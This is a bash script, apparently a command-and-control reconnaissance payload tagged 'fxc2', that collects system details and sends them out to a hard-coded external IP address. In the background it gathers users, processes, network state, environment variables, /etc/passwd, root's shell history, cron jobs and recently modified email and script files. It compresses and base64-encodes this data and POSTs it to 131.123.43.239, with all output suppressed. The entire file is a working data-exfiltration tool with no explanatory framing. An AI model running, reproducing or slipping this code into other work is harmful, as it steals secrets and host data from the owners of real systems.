#!/bin/bash
# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
exec 9>/tmp/.hp1.lock; flock -n 9 || exit 0
U=http://131.123.43.239
post(){ curl -sk -m 60 -X POST --data-binary @- "$U/up" -H "X-Name: $1" >/dev/null 2>&1; }
( id; hostname; uname -a; cat /etc/os-release 2>/dev/null; echo ==ENV==; env; echo ==IP==; ip -4 a; ip r; arp -n; echo ==SS==; ss -tlnp; ss -tnp 2>/dev/null | head -40; echo ==PS==; ps auxf 2>/dev/null | head -80; echo ==CRON==; crontab -l 2>&1; cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d 2>/dev/null; echo ==HIST==; cat /root/.bash_history 2>/dev/null | head -60; echo ==HOME==; ls -la / /root /home /tmp /var/tmp /opt 2>/dev/null; echo ==SPOOL==; find /var/spool /var/mail /srv /data /mail /var/lib/postfix -type f 2>/dev/null | head -60; echo ==SAMPLES==; find / -xdev \( -iname "*.eml" -o -iname "*.msg" -o -iname "*.zip" -o -iname "*.js" -o -iname "*.vbs" -o -iname "*.ps1" \) -mmin -2880 2>/dev/null | grep -vE "^/(proc|sys|usr/lib|usr/share|etc)" | head -60; echo ==MIME==; find / -xdev -type f -mmin -720 2>/dev/null | grep -vE "^/(proc|sys|usr|etc|var/lib|var/cache|var/log|run)" | head -80; ) 2>&1 | gzip -c | base64 -w0 | post hp1_out
( cat /etc/hosts; cat /etc/resolv.conf; ) 2>/dev/null | post hp1_hosts
echo done | post hp1_fin


